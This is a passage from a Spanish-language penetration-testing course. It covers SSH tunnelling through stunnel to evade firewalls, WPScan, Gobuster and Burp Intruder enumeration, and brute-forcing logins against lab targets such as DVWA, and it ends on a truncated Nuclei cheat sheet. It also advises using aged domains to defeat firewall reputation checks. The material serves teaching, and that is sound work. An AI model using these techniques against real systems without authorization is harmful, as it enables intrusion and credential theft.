![Maquina Cliente3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente3.png?raw=true)

Reenv√≠o de puerto SSH

Este t√∫nel SSH crear√° un puerto de escucha en la m√°quina cliente para reenviar el tr√°fico a trav√©s del t√∫nel ssh que est√° oculto dentro del t√∫nel ssl(443).

Crear el t√∫nel de reenv√≠o de puertos ssh

> sudo ssh -q -C -N -L 9090:<destination ip>:<destination port> <user>@127.0.0.1 -p 9443

> -L : specifies the listening port of the port forward on the client
> 
> - q : runs quiet mode where no output is displayed locally
> - C : compress data in the tunnel to save bandwidth
> - N : non interactive ssh session just creats the tunnel no command prompt
> - p : defines the destination port to connect to (We are conencting to port forward provided by stunnel client)

![Maquina Cliente4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente4.png?raw=true)

## **Conclusi√≥n**

Con esta configuraci√≥n y t√©cnica del servidor proxy inverso podemos hacer que todo el tr√°fico O espec√≠fico aparezca como HTTPS(443). Una vez que el cliente establece su t√∫nel SSL con el servidor proxy inverso, el firewall no puede distinguir entre nuestro t√∫nel SSL y el tr√°fico HTTPS(443) normal debido al cifrado. En las redes p√∫blicas en general, esto es suficiente para evitar las restricciones del firewall. Esto tambi√©n funciona como alternativa de VPN en redes donde el tr√°fico VPN est√° bloqueado. Recuerde que s√≥lo el tr√°fico TCP puede atravesar el proxy ssh Socks o el reenv√≠o de puertos.

Cuando se trata de firewalls avanzados, existen muchos factores adicionales que pueden determinar si la conexi√≥n SSL est√° permitida a trav√©s del puerto 443. Los firewalls m√°s avanzados no solo pueden realizar inspecci√≥n SSL (descifrado), sino que tambi√©n pueden tomar decisiones para permitir el tr√°fico seg√∫n la direcci√≥n IP geogr√°fica de destino. ubicaci√≥n, atributos del certificado SSL, categorizaci√≥n del dominio y reputaci√≥n del dominio. Aqu√≠ es donde es crucial elegir un dominio con un TLD (dominio de nivel superior) com√∫n y un pa√≠s generalmente confiable para alojar el servidor proxy inverso.

<aside>
üëâ Se recomendar√≠a registrar un dominio caducado que ya tenga categorizaci√≥n de URL y buena reputaci√≥n. Si ha comprado un dominio nuevo, hay formas de clasificarlo y crear una reputaci√≥n de dominio. Estos no se tratar√°n aqu√≠, pero se abordar√°n en otro blog. Si lleg√≥ hasta aqu√≠, espero que haya sido √∫til y estoy seguro de que se le ocurrir√°n algunos casos de uso creativos para esta configuraci√≥n.
</aside>

Es fundamental comprender primero c√≥mo funciona un firewall antes de intentar hackearlo. Un firewall realiza un seguimiento de todo el tr√°fico de la red, tanto entrante como saliente, y, seg√∫n las reglas que se hayan configurado, permite o proh√≠be que ese tr√°fico llegue a su destino. El hecho de que los firewalls sean frecuentemente la l√≠nea inicial de defensa en una red los convierte en un ejemplo de seguridad perimetral.

Resumamos todo lo escrito anteriormente. Piense siempre fuera de lo com√∫n. Pruebe diferentes t√©cnicas de codificaci√≥n y algunas funcionar√°n. No seas perezoso en comprobar los registros DNS. No olvide que se puede eludir cualquier protecci√≥n en los recursos web y que WAF no es una panacea para todos los problemas. Los hackers no duermen y siempre buscan nuevas t√©cnicas para atacar tus recursos y obtener beneficios. Las pruebas de penetraci√≥n peri√≥dicas le ayudar√°n a evitar muchos problemas.

# Enumeraci√≥n y explotaci√≥n de vulnerabilidades

## **Enumeraci√≥n web con WPScan**

WPScan se lanz√≥ por primera vez en 2011, ha sobrevivido al tiempo y se destac√≥ como una herramienta vital que todo pentester deber√≠a tener en su caja de herramientas.

WPScan es capaz de enumerar e investigar algunas categor√≠as de vulnerabilidades de seguridad presentes en los sitios de WordPress como:

- Divulgaci√≥n de informaci√≥n confidencial (versiones de instalaci√≥n de complementos y temas para vulnerabilidades reveladas o CVE)
- Descubrimiento de ruta (buscando permisos de archivos mal configurados)
- Pol√≠ticas de contrase√±as d√©biles (fuerza bruta de contrase√±as)
- Presencia de instalaci√≥n predeterminada (buscando archivos predeterminados)
- Prueba de firewalls de aplicaciones web (complementos WAF comunes)

### **Instalaci√≥n:**

Afortunadamente, WPScan viene preinstalado en la √∫ltima versi√≥n de Kali Linux y Parrot OS. Si est√° utilizando una versi√≥n anterior de Kali, simplemente puede instalarla desde el siguiente comando en su terminal.

> sudo apt update && sudo apt install wpscan

![WPScan1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan1.png?raw=true)

Si est√° utilizando diferentes sistemas operativos y otras distribuciones, puede consultar la documentaci√≥n del [desarrollador](https://github.com/wpscanteam/wpscan#install) y aprender c√≥mo instalarlo en su m√°quina.

**Base de datos de WPScan:**

WPScan utiliza informaci√≥n dentro de una base de datos local como punto de referencia principal al enumerar temas y complementos. Antes de utilizar WPScan, se recomienda encarecidamente que actualice esta base de datos antes de realizar cualquier an√°lisis.

Para actualizar su base de datos wpscan, simplemente ejecute este comando en su terminal

> wpscan --update

![WPScan2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan2.png?raw=true)

### **Enumeraci√≥n de temas:**

WPS puede tener algunas formas de determinar el tema instalado en el sitio. B√°sicamente, primero utiliza una t√©cnica que tambi√©n podemos hacer manualmente. Simplemente podemos mirar los activos de las cargas del navegador web y luego buscar la ubicaci√≥n del tema instalado en el servidor web. Usando la pesta√±a "Red" en su navegador web, puede ver qu√© archivos se cargan cuando visita ese sitio.

![WPScan3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan3.png?raw=true)

Arriba podemos ver una captura de pantalla donde se han cargado muchos archivos y mientras los revisaba encontr√© esta URL

[http://www.anywordpressintalledsite.com/wp-content/themes/twentynineteen](http://www.anywordpressintalledsite.com/wp-content/themes/twentynineteen)

Al mirar esta URL podemos estar seguros de que el tema instalado es twentynineteen. Ahora automaticemos nuestro trabajo, usemos nuestro wpscan para descubrir qu√© tema exacto se est√° ejecutando escribiendo el siguiente comando

> wpscan --url http://www.anywordpressintalledsite.com/ --enumerate t
> 

y aqu√≠ esta el resultado:

![WPScan4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan4.png?raw=true)

Lo mejor de¬† wpscan es que le dice c√≥mo descubri√≥ ese resultado.

![WPScan5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan5.png?raw=true)

### **Enumeraci√≥n de complementos:**

una caracter√≠stica muy com√∫n del servidor web es la lista de directorios, es como el comando **ls** en Linux. Enumera los archivos y directorios enumerados en ese servidor web. El ‚ÄúListado de directorios‚Äù ocurre cuando no hay ning√∫n archivo presente que se le haya indicado al servidor web que procese. Un archivo muy com√∫n es ‚Äúindex.html‚Äù e ‚Äúindex.php‚Äù. Como estos archivos no est√°n presentes en el directorio /a/, se muestran los contenidos:

![WPScan6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan6.png?raw=true)

wpscan puede aprovechar esta funci√≥n para averiguar qu√© complementos est√°n instalados. Dado que todos estar√°n ubicados en /wp-content/plugins/pluginname, WPScan puede enumerar complementos comunes/conocidos. Podemos usar el siguiente comando para enumerar complementos.

> wpscan --url http://www.anywordpressintalledsite.com/ --enumerate p
> 

Al leer la documentaci√≥n para desarrolladores de WordPress, podemos aprender sobre el "[read me](https://developer.wordpress.org/plugins/wordpress-org/how-your-readme-txt-works/#how-the-readme-is-parsed)" para descubrir c√≥mo WPScan determin√≥ el n√∫mero de versi√≥n. Simplemente, los complementos deben tener un archivo ‚ÄúREADME.txt‚Äù. Este archivo contiene metainformaci√≥n como el nombre del complemento, las versiones de WordPress con las que es compatible y una descripci√≥n.

![WPScan7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan7.png?raw=true)

### **Enumeraci√≥n de usuarios:**

Despu√©s de leer todo esto, creo que se dar√° cuenta de lo poderosa que es esta herramienta. Entonces, si te digo que tambi√©n podemos enumerar usuarios usando esta herramienta, no te sorprender√°. La forma en que WPScan enumera a los usuarios es interesantemente simple. Los sitios de WordPress utilizan autores para las publicaciones. Los autores son de hecho un tipo de usuario.

![WPScan8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan8.png?raw=true)

Usemos nuestro wpscan para escanear a los usuarios y ¬øc√≥mo podemos hacerlo exactamente? simple siguiendo el comando dado

> wpscan --url http://www.anywordpressintalledsite.com/ --enumerate u

![WPScan9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan9.png?raw=true)

Arriba podemos ver que encontr√≥ al usuario pero dice algo de fuerza bruta. s√≠, tambi√©n puede hacer eso. wpscan puede aplicar fuerza bruta usando una lista mundial. ¬øDespu√©s de eso dice error de inicio de sesi√≥n? s√≠, intent√≥ iniciar sesi√≥n con ese nombre de usuario y descubri√≥ que el usuario es real.

![WPSca10](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan10.png?raw=true)

**La bandera "Vulnerable":**

hasta ahora solo hemos enumerado temas, complementos y usuarios y luego visitaremos sitios como MITRE, NVD y CVEDetails para buscar los nombres de estos complementos y los n√∫meros de versi√≥n para determinar cualquier vulnerabilidad. Lo cual lleva bastante tiempo y es aburrido. Es por eso que wpscan tiene un indicador espec√≠fico para hacer nuestro trabajo y ese indicador es -v. Para comprobar si alg√∫n complemento instalado es vulnerable o no, podemos escribir este comando y averiguarlo.

> wpscan --url http://www.anywordpressintalledsite.com/ --enumerate vp

Arriba dije -v flag pero escrib√≠ vp. ¬øComet√≠ un error? No, esa p significa complemento para que pueda indicarle a wpscan que verifique los complementos si son vulnerables o no.

![WPSca11](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan11.png?raw=true)

Obtuvimos nuestros resultados en solo unos segundos y descubrimos que los complementos no son vulnerables.

### **Ataque de contrase√±a:**

Despu√©s de determinar una lista de posibles nombres de usuario en la instalaci√≥n de WordPress, podemos usar WPScan para realizar una t√©cnica de fuerza bruta contra el nombre de usuario que especificamos y una lista de contrase√±as que proporcionamos. Simplemente, usamos el resultado de nuestra enumeraci√≥n de nombre de usuario para crear un comando como este:

> wpscan --url http://www.anywordpressintalledsite.com/ ‚Äì-passwords rockyou.txt ‚Äì-usernames Phreakazoid

![WPSca12](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan12.png?raw=true)

### Ajuste de la agresividad de WPScan (WAF):

a menos que se especifique, WPScan intentar√° ser lo menos "ruidoso" posible. Muchas solicitudes a un servidor web pueden activar cosas como firewalls y, en √∫ltima instancia, provocar que el servidor lo bloquee.

Esto significa que nuestro WPScan puede omitir algunos complementos y temas. Afortunadamente, podemos usar argumentos como --plugins-detectiony un perfil de agresividad (pasivo/agresivo) para especificar esto. Por ejemplo:--plugins-detection aggressive

### **Resumen - Hoja de referencia:**

> p Enumerate Plugins --enumerate p

> t¬†Enumerate Themes --enumerate t

> u Enumerate Usernames --enumerate -u

> v¬† check if plugin is vulnerable¬† --enumerate vp

> aggressive adjust aggressiveness --plugins-detection aggressive
 

## **Enumeraci√≥n web usando Gobuster**

### **Enumeraci√≥n manual**

Cuando comienza su enumeraci√≥n web, la mejor herramienta que puede utilizar es su navegador favorito. El m√≠o es Firefox, as√≠ que puedes usar el tuyo como Chrome, Opera y Brave tambi√©n es bastante bueno. Mantiene un registro de los datos que recibe y de qui√©n. Podemos usar esto para una variedad de actividades: encontrar esa foto exacta o, m√°s √∫tilmente, la ubicaci√≥n de ciertos archivos o activos que se est√°n cargando. Esto podr√≠a incluir cosas desde scripts hasta URL de p√°ginas.

### **Usando nuestra consola de desarrollador de navegadores**

Los navegadores, incluidos Chrome y Firefox, tienen un conjunto de herramientas ubicadas en "Herramientas de desarrollo/Consola". Vamos a hablar de Firefox, sin embargo, Chrome tiene una suite muy similar. Esta suite incluye una gama de herramientas que incluyen:

- Ver el c√≥digo fuente de la p√°gina
- Encontrar activos
- Depuraci√≥n y ejecuci√≥n de c√≥digo como javascript en el lado del cliente (nuestro navegador)

Usando "F12" en nuestro teclado, este es un atajo para iniciar este conjunto de herramientas.

![WPSca13](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan13.png?raw=true)

En la imagen de arriba puede ver el encabezado de la p√°gina Hola mundo y all√≠ abajo puede ver que la herramienta "inspector" de la secci√≥n est√° abierta. Esto nos permite ver el c√≥digo fuente html de la p√°gina web. A menudo contiene cosas como comentarios de desarrolladores y el nombre de ciertos aspectos de las caracter√≠sticas de la p√°gina web, incluidos formularios y me gusta.

Los desarrolladores suelen dejar comentarios en forma de **<! ‚Äî ‚Üí** etiquetas‚Ä¶por ejemplo: <! ‚Äî Este es un comentario ‚Üí que no se muestra en el navegador como podemos ver aqu√≠:

![WPSca14](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan14.png?raw=true)

## **Gobuster**

Gobuster es una de las mejores herramientas que existen para enumerar sitios web y por web me refiero a directorios, DNS, subdominios y mucho m√°s. Puede obtener m√°s informaci√≥n y el c√≥digo fuente [aqu√≠](https://github.com/OJ/gobuster) .

**Comencemos con c√≥mo instalar Gobuster en Kali Linux:**

Puede instalar gobuster usando el siguiente comando en su terminal.

> sudo apto instalar gobuster

**Flags**

> - t --threads¬†No. de subprocesos simult√°neos
> - v --verbose Salida detallada
> - z --no-progress No mostrar el progreso
> - q --quiet No imprimir el banner y el ruido
> - o -- salida Archivo de salida para escribir los resultados

Normalmente cambiar√© la cantidad de subprocesos a 64 para aumentar la velocidad de mis escaneos. Si no cambia la cantidad de subprocesos, Gobuster puede ser un poco lento.

## **Modos Gobuster**

Gobuster es una herramienta muy poderosa y vers√°til. Tiene diferentes modos para hacer diferentes cosas, como el modo dir se usa cuando busca directorios web en una aplicaci√≥n web y el modo dns se usa cuando busca subdominios.

### **Modo ‚Äúdir‚Äù:**

podemos adivinar qu√© hace este modo, ya que su nombre lo indica se utiliza para forzar directorios en aplicaciones web. Es una herramienta muy poderosa que no solo escanea el sitio web sino que tambi√©n devuelve su c√≥digo de estado y esto le permitir√° saber inmediatamente si usted, como usuario externo, puede solicitar ese directorio o no. La funcionalidad adicional de Gobuster es que tambi√©n te permite buscar archivos con la adici√≥n de una simple bandera.

- **Usando el modo dir** :

Para usar el modo dir, escriba el siguiente comando

> gobuster dir

Este no es el comando completo pero le dice al gobuster que el usuario desea buscar directorios en web. Ahora, despu√©s de esto, tendr√°s que agregar la URL y la lista de palabras.

> gobuster dir -u [http://](https://google.com/)10.10.10.10 -w wordlist.txt

**Nota** : La URL ser√° la ruta base desde donde Gobuster comienza a buscar. Entonces, la URL anterior utiliza el directorio web ra√≠z. Por ejemplo, en una instalaci√≥n t√≠pica de Apache en Linux, esto es */var/www/html* . ***[Entonces ,](http://10.10.10.10/products.)*** si tiene un directorio de " **productos** " y desea enumerar ese directorio, debe configurar la URL como *[http://10.10.10.10/productos* .](http://10.10.10.10/products.) Tambi√©n puedes pensar en esto como *[http://example.com/path/to/folder* .](http://example.com/path/to/folder.) Observe tambi√©n que especifiqu√© el protocolo HTTP. Esto es importante y necesario.

**Otras banderas √∫tiles:**

> - c --cookies¬†Cookies que se usar√°n en las solicitudes
> - x --extensions Extensi√≥n(es) de archivo a buscar
> - H --headers Especifique encabezados HTTP, -H 'Encabezado1: val1'
> - k --no-tls -validation Omitir la verificaci√≥n del certificado TLS
> - n --no-status No imprimir c√≥digos de estado
> - P --password Contrase√±a para autenticaci√≥n b√°sica
> - s --status-codes C√≥digos de estado positivos
> - b --status-codes-blacklist C√≥digos de estado negativos
> - U --username Nombre de usuario para autenticaci√≥n b√°sica

aqu√≠ -x o - el indicador de extensiones es realmente √∫til para buscar archivos con una extensi√≥n espec√≠fica.

> gobuster dir -u http://10.10.10.10 -w wordlist.txt -x html,php,bak

En el comando anterior especificamos buscar solo aquellos archivos que tengan extensi√≥n .html, .php, .bak. El indicador -k es especial porque tiene un uso importante durante las pruebas de penetraci√≥n y captura los eventos del indicador. En una sala de captura de bandera en TryHackMe, por ejemplo, si HTTPS est√° habilitado, lo m√°s probable es que encuentre un error de certificado no v√°lido como el siguiente

![WPSca15](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan15.png?raw=true)

Si ejecuta gobuster en este sitio sin -k flag gobuster aparecer√° un error largo, as√≠ que para evitar este tipo de certificaciones no v√°lidas y brindarle sus resultados, use -k falg en su comando.

### **Modo ‚Äúdns‚Äù:**

el siguiente modo en el que nos centraremos es el modo ‚Äúdns‚Äù. Esto permite a Gobuster aplicar fuerza bruta a subdominios. Durante una prueba de penetraci√≥n (o capturar la bandera), es importante verificar los subdominios del dominio principal de su objetivo. Los subdominios aumentan su alcance, por lo que un alcance mayor tiene mayores posibilidades de encontrar una vulnerabilidad.

- **Usando el modo ‚Äúdns‚Äù:**

Puede usar el modo dns escribiendo el siguiente comando en su terminal

> gobuster dns 

Como modo directorio, este comando est√° incompleto, esto le indicar√° al gobuster que el usuario desea realizar fuerza bruta en el subdominio, por lo que debe especificar nuevamente un dominio y un archivo de lista de palabras.

> gobuster dns -d mydomain.com -w subdomains.txt

Este comando le dice a gobuster que realice una fuerza bruta en un subdominio en midominio.com

Otras falgs √∫tiles:

> -c --show-cname Mostrar registros CNAME (no se puede usar con '-i')
> - i --show-ips Mostrar direcciones IP
> - r --resolverUsar servidor DNS personalizado

### **Modo vhost:**

El √∫ltimo modo en el que nos centraremos es el modo ‚Äúvhost‚Äù. Esto permite a Gobuster aplicar fuerza bruta a hosts virtuales. Los hosts virtuales son diferentes sitios web en la misma m√°quina. En algunos casos, pueden parecer subdominios, ¬°pero no te dejes enga√±ar! Los hosts virtuales est√°n basados ‚Äã‚Äãen IP y se ejecutan en el mismo servidor. Esto no suele ser evidente para el usuario final. En un compromiso, puede que valga la pena ejecutar Gobuster en este modo para ver si se le ocurre algo. ¬°Nunca se sabe, puede que encuentre algo! Al participar en salas de TryHackMe, los hosts virtuales ser√≠an una buena manera de ocultar un sitio web completamente diferente si no apareciera nada en el escaneo del puerto principal 80/443.

**Usando el modo vhost:**

como dir y dns, simplemente puede escribir el siguiente comando y ejecutar el modo vhost en gobuster:

> gobuster vhost

Esto notifica al gobuster que el usuario desea aplicar fuerza bruta a los hosts virtuales en la URL de destino. Despu√©s de esto, debes proporcionar una URL y un archivo de lista de palabras.

> gobuster vhost -u [http://10.10.10.10](http://10.10.10.10/) -w wordlist.txt

**Otras banderas √∫tiles:**

Puedes ver su bandera y otra documentaci√≥n en la [documentaci√≥n oficial.](https://github.com/OJ/gobuster#vhost-mode-options)

**Listas de palabras predeterminadas de Kali Linux:**

estas son las listas de palabras predeterminadas que vienen preinstaladas en Kali Linux. Mencionar√© las listas de palabras uso para realizar fuerza bruta de directorios en Kali Linux.

- /usr/share/wordlists/dirbuster/directory-list-2.3-*.txt
- /usr/share/wordlists/dirbuster/directory-list-1.0.txt
- /usr/share/listas de palabras/dirb/big.txt
- /usr/share/wordlists/dirb/common.txt
- /usr/share/listas de palabras/dirb/small.txt
- /usr/share/wordlists/dirb/extensions_common.txt: ¬°√∫til para buscar archivos!

/usr/share/wordlists tiene muchas listas de palabras para diferentes tareas. Puedes ir all√≠ y comprobarlas todas vos mismo.

**Listas no est√°ndar:**

adem√°s de lo anterior, Daniel Miessler ha creado un incre√≠ble repositorio de GitHub llamado [SecLists](https://github.com/danielmiessler/SecLists) . Compila muchas listas diferentes utilizadas para muchas cosas diferentes. ¬°La mejor parte es que est√° en apto! simplemente puede instalar todas esas listas de palabras en su kali usando el siguiente comando:

> sudo apt install seclists

En estas dos listas de palabras creo que obtendr√°s todo tipo de listas mundiales para hacer tu trabajo de fuerza bruta.

## **Burp Suite: enumeraci√≥n de p√°ginas web y pruebas de vulnerabilidad**

**¬øQu√© es Burp Suite?**

Burp Suite es una plataforma integral para pruebas de seguridad de aplicaciones web. Se puede utilizar para enumeraciones y an√°lisis detallados de aplicaciones web. La herramienta puede simplemente interceptar solicitudes HTTP/S y actuar como intermediario entre el usuario y los sitios. Los detalles necesarios se capturan del sitio web a medida que el usuario navega. Esta informaci√≥n proporciona informaci√≥n sobre la seguridad de una aplicaci√≥n web. *Burp puede actuar como intermediario interceptando el tr√°fico desde su navegador a una p√°gina web, permiti√©ndole modificar y automatizar cambios en las solicitudes de la p√°gina web.*

Al abrir Burp, te encuentras con un proyecto en blanco con un mont√≥n de pesta√±as. No te preocupes, cubriremos las pesta√±as esenciales.

### **Configuraci√≥n de la suite Burp**

Confirme que el oyente Burp Proxy est√© activo

- Abra burp y navegue hasta la pesta√±a proxy ‚Üí opciones
- Verifique que el detector de proxy est√© activo y configurado en 127.0.0.1:8080

Configurar proxy en el navegador web

- Para Firefox, navegue a preferencias ‚Üí avanzado ‚Üí red ‚Üí configuraci√≥n
- Active *la configuraci√≥n manual de proxy: verifique que est√© configurado en el mismo proxy que burp (127.0.0.1 en el puerto 8080).*

![WPSca16](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan16.png?raw=true)

### **Instalaci√≥n del certificado SSL Burp**

- Navegue hasta [http://burp](http://burp/) y descargue el certificado haciendo clic en *Certificado CA* a la derecha.
- Regrese a la p√°gina de configuraci√≥n de seguridad de la red en Firefox y haga clic en *Certificados*
- Desde all√≠, importe el certificado que descarg√≥ y marque todas las casillas.

![WPSca17](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan17.png?raw=true)

### **Caracter√≠sticas b√°sicas**

Para comenzar, familiaric√©monos con algunas de las pesta√±as comunes disponibles en Burp Suite: Intruso, Repetidor y Secuenciador.

**Intruder**

Con Burp Intruder, se pueden automatizar ataques personalizados contra aplicaciones web. La personalizaci√≥n de ataques requiere que especifiquemos una o m√°s cargas √∫tiles y la posici√≥n donde se colocar√°n en el sitio web.

- Casos de uso: enumeraci√≥n de identificadores, recopilaci√≥n de datos √∫tiles y b√∫squeda de vulnerabilidades.

**Repeater**

- El repetidor se puede utilizar para repetir solicitudes HTTP individuales manipuladas manualmente. Esto resulta tremendamente √∫til cuando se prueban varias cargas √∫tiles en la misma solicitud. Con el repetidor puedes probar par√°metros en la misma p√°gina sin hacer ning√∫n trabajo adicional con el navegador. Emitir solicitudes en una secuencia espec√≠fica se vuelve mucho m√°s f√°cil y puede identificar c√≥mo reacciona la p√°gina a los par√°metros cambiantes en cada paso.
- Casos de uso: probar un conjunto de par√°metros espec√≠ficos en la misma solicitud de p√°gina web y volver a emitir solicitudes para verificar manualmente los problemas informados.

**Sequencer**

- El secuenciador Burp se puede utilizar para analizar la calidad de la aleatoriedad en una muestra de elementos de datos. En √∫ltima instancia, esto significa que el secuenciador es bueno para probar elementos de datos que deben ser impredecibles.
- Casos de uso: prueba de tokens anti-CSRF o tokens de restablecimiento de contrase√±a, etc.

### **Ejemplo de explotaci√≥n de vulnerabilidad con Burp**

Burp Suite nos brinda herramientas de automatizaci√≥n adicionales para usar mientras probamos una aplicaci√≥n web. Para practicar el ataque a vulnerabilidades utilizaremos la **[aplicaci√≥n web Damn Vulnerable (DVWA)](http://www.dvwa.co.uk/)** . **DVWA** viene precargado con Metasploitable 2 pero tambi√©n se puede descargar de forma independiente y ejecutar desde un servidor local. **DVWA** est√° separado para ataques espec√≠ficos, como se ve en su barra de navegaci√≥n lateral. Esto nos brinda la oportunidad de explorar ataques web comunes en distintos niveles de dificultad.

Una vez que **DVWA** est√© en funcionamiento, inicie sesi√≥n y navegue hasta la pesta√±a de seguridad para cambiar el nivel de seguridad a bajo. Esto har√° que el sitio web sea vulnerable a una gama m√°s amplia de ataques, lo que har√° que sea m√°s f√°cil sentirse c√≥modo con una nueva herramienta.

**Fuerza bruta en una p√°gina de inicio de sesi√≥n**

Para este ejemplo usaremos Intruder de Burp para alterar la solicitud HTTP para la p√°gina de inicio de sesi√≥n dentro de **DVWA** .

- Comience iniciando sesi√≥n en **DVWA** usando el nombre de usuario " *admin* " y la contrase√±a "*password*".
- Verifique que la seguridad de **DVWA** est√© baja para este ataque. Unos niveles de seguridad m√°s altos impedir√°n que este ataque funcione.
- Navega a la secci√≥n *Fuerza Bruta* de la navegaci√≥n lateral. Aqu√≠ ver√° cuadros de entrada para nombre de usuario y contrase√±a.
- Al pasar las credenciales incorrectas aparecer√° un error.

![WPSca18](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan18.png?raw=true)

Intento de nombre de usuario: admin y contrase√±a: 1234, lo que arroj√≥ un error. Supongamos que conocemos el nombre de usuario del usuario que inici√≥ sesi√≥n en el sitio. Podemos usar Burp para interceptar solicitudes e intentar obtener una lista de contrase√±as en esta p√°gina de inicio de sesi√≥n.

Muestra que el nombre de usuario y la contrase√±a se pasan en la URL

- Haga clic derecho en la secci√≥n sin formato y *Enviar a Intruso*
- Desde la pesta√±a *Intruso ‚Üí Posiciones* podemos seleccionar los par√°metros que queremos modificar en nuestra solicitud. Desde el principio se seleccionan todas las entradas posibles. Presione el bot√≥n borrar a la derecha para borrar las selecciones.
- Resalte el valor de la contrase√±a. En mi caso, la contrase√±a inicial ingresada fue "1234". Seleccione ese valor y presione el bot√≥n Agregar a la derecha.

![WPSca19](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan19.png?raw=true)

Se podr√≠an realizar m√°s selecciones para modificar m√°s valores en cada solicitud.

- La √∫ltima parte de este ataque es agregar una carga √∫til para modificar el valor de la contrase√±a que seleccionamos.
- Vaya a la pesta√±a *Cargas √∫tiles* . El conjunto de carga √∫til permanecer√° como una lista simple y a continuaci√≥n agregaremos valores a una lista para que Burp los use en su carga √∫til.
- La siguiente imagen muestra las contrase√±as adivinadas agregadas a la carga √∫til para que Burp las pruebe. La lista de contrase√±as comunes se puede descargar en l√≠nea para utilizarla en intentos de fuerza bruta m√°s extensos.
- Haga clic en *Iniciar ataque* para iniciar el ataque.

![WPSca20](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan20.png?raw=true)

- Deber√≠a aparecer una nueva ventana mostrando los resultados de Intruder.

![WPSca21](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan21.png?raw=true)

- ¬øC√≥mo sabemos si funcion√≥? Observar la longitud nos dice que cuando la carga √∫til es "password", obtenemos un resultado diferente al de los otros env√≠os. Eso significa que deber√≠amos examinar m√°s de cerca ese valor.
- Al hacer clic en la fila, aparecer√°n acciones adicionales en la parte inferior de la ventana.
- Pasar a la pesta√±a *Renderizar* nos mostrar√° el resultado cuando se ingrese esa carga √∫til espec√≠fica.

![WPSca22](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan22.png?raw=true)

- Como puede ver, la contrase√±a funcion√≥ y se nos muestra una p√°gina de inicio de sesi√≥n v√°lida. Esto se puede verificar yendo a **DVWA** y probando administrador y contrase√±a como valores de inicio de sesi√≥n. El mismo resultado deber√≠a aparecer.

![WPSca24](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan24.png?raw=true)

¬°Felicidades! Ya ha completado su primer ataque utilizando Burp para modificar las solicitudes HTTP. Este es un ejemplo sencillo de c√≥mo se puede utilizar Burp para realizar pruebas de seguridad de aplicaciones. Existen muchos m√°s ataques a aplicaciones web. Burp Suite proporciona herramientas adicionales para solucionar ataques, ya sea de forma manual o automatizada. Profundizar en Burp Suite revelar√° cu√°n poderoso puede ser realmente.

### **¬øQu√© sigue?**

- Consulte tutoriales de ataques adicionales en el sitio web de Burp Suite para familiarizarse con el papel de Burp en ataques m√°s intensivos.
- Utilice Burp para realizar ataques web comunes a otra aplicaci√≥n web vulnerable, como [Mutillidae](https://www.owasp.org/index.php/OWASP_Mutillidae_2_Project) o el [proyecto OWASP WebGoat](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project) .
- Contin√∫e usando Burp en su pr√≥ximo flujo de trabajo de prueba de aplicaciones web y juegue con una extensi√≥n de terceros para Burp para agregar m√°s funciones.
- Actualice a la versi√≥n Pro para comprobar las capacidades de escaneo de vulnerabilidades de Burp Suite. Si el precio de Pro parece demasiado elevado, entonces OWASP Zap es una alternativa gratuita a Burp que permite escanear vulnerabilidades.

### Recursos adicionales

- [La metodolog√≠a Burp](https://support.portswigger.net/customer/portal/articles/2326039-the-burp-methodology-) : tutoriales proporcionados por Burp Suite
- [Burp Suite para la seguridad de aplicaciones web](https://vimeo.com/album/3510171) : tutoriales en v√≠deo de Bucky Roberts

## **Nuclei: Automatizaci√≥n de pruebas de servicios de red y aplicaciones web**

Nuclei es un marco de c√≥digo abierto dise√±ado para automatizar la detecci√≥n y explotaci√≥n de vulnerabilidades en aplicaciones web y otros servicios de red. Permite a los pentester e investigadores de seguridad definir plantillas personalizadas que especifican un conjunto de solicitudes HTTP para enviar a un objetivo, junto con las reglas de coincidencia correspondientes que pueden usarse para identificar vulnerabilidades o configuraciones incorrectas.

### **Instalaci√≥n**

Para instalar Nuclei, puedes descargar la √∫ltima versi√≥n desde el repositorio oficial de [GitHub](https://github.com/projectdiscovery/nuclei) y seguir las instrucciones.

### **Hoja de trucos**

Aqu√≠ hay una hoja de trucos completa con algunos comandos de Nuclei com√∫nmente utilizados para la b√∫squeda de recompensas por errores:

> 1. Mostrar informaci√≥n de ayuda
>  
> nuclei -h
> 
> 2. Mostrar la versi√≥n actual de Nuclei
> 
> nuclei -version
> 
> 3. Cargar una lista de objetivos desde un archivo
> 
> nuclei -l target.txt -t ~ /nuclei-templates/
> 
> 4. Especificar un √∫nico objetivo para probar
> 
> nuclei -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 5. Especifique una URL para probar
> 
> los n√∫cleos -u https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 6. Ejecute n√∫cleos en modo silencioso (suprima la salida)
> 
